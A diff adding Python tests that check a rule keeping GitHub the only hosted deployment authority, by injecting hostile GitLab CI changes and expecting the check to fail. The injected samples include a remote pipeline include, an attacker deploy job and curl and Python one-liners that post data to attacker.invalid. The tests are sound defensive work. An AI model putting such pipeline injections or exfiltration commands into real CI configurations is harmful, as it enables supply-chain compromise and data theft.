@@ -1,5 +1,6 @@
 from __future__ import annotations
 
+import hashlib
 import json
 import os
 import subprocess
@@ -7,9 +8,19 @@ import sys
 from pathlib import Path
 
 import yaml
+from korpus.infrastructure_requirements import INFRASTRUCTURE_REQUIREMENTS, load_context
 from korpus.release import RELEASE_TAG
 
 ROOT = Path(__file__).resolve().parents[3]
+
+
+def _sole_hosted_authority_holds(context) -> bool:
+    requirement = next(
+        item
+        for item in INFRASTRUCTURE_REQUIREMENTS
+        if item.id == "release.github.sole_hosted_authority"
+    )
+    return bool(requirement.holds(context))
 
 
 def test_production_assurance_verifier_accepts_runtime_trust_only_through_shared_guard() -> None:
@@ -188,3 +199,63 @@ def test_production_release_script_rejects_a_noncanonical_repository_before_pack
     )
     assert result.returncode != 0
     assert "canonical GitHub repository" in result.stderr
+
+
+def test_infrastructure_contract_rejects_reactivated_gitlab_wif() -> None:
+    context = load_context(ROOT)
+    assert _sole_hosted_authority_holds(context)
+    context.ci_config["gcp:deploy-production"]["id_tokens"] = {
+        "GITLAB_OIDC_TOKEN": {"aud": "https://iam.googleapis.com"}
+    }
+    assert not _sole_hosted_authority_holds(context)
+
+
+def test_infrastructure_contract_rejects_an_added_gitlab_deploy_path() -> None:
+    context = load_context(ROOT)
+    assert _sole_hosted_authority_holds(context)
+    context.ci_config["attacker-deploy"] = {
+        "stage": "deploy",
+        "script": ["gcloud run deploy attacker --image example.invalid/attacker"],
+    }
+    assert not _sole_hosted_authority_holds(context)
+
+
+def test_infrastructure_contract_rejects_gitlab_delegation_and_arbitrary_commands() -> None:
+    mutations = (
+        ("include", [{"remote": "https://attacker.invalid/pipeline.yml"}]),
+        ("include", [{"local": "attacker-controlled.yml"}]),
+        ("attacker-child", {"trigger": "attacker/project"}),
+        ("attacker-post", {"script": ["curl --data payload https://attacker.invalid/deploy"]}),
+        (
+            "attacker-python",
+            {
+                "script": [
+                    'python -c \'__import__("urllib.request").request.urlopen("https://attacker.invalid/deploy")\''
+                ]
+            },
+        ),
+    )
+    for key, value in mutations:
+        context = load_context(ROOT)
+        context.ci_config[key] = value
+        assert not _sole_hosted_authority_holds(context), key
+
+
+def test_infrastructure_contract_rejects_pipeline_and_policy_expansion_together() -> None:
+    context = load_context(ROOT)
+    job = {
+        "stage": "deploy",
+        "script": ["curl --data payload https://attacker.invalid/deploy"],
+    }
+    encoded = json.dumps(job, ensure_ascii=False, sort_keys=True, separators=(",", ":")).encode()
+    context.ci_config["attacker:deploy"] = job
+    context.ci_policy["allowed_job_sha256"]["attacker:deploy"] = hashlib.sha256(encoded).hexdigest()
+    assert not _sole_hosted_authority_holds(context)
+
+
+def test_infrastructure_contract_rejects_mutating_gitlab_default_hook() -> None:
+    context = load_context(ROOT)
+    context.ci_config["default"]["before_script"] = [
+        "curl --data payload https://attacker.invalid/deploy"
+    ]
+    assert not _sole_hosted_authority_holds(context)
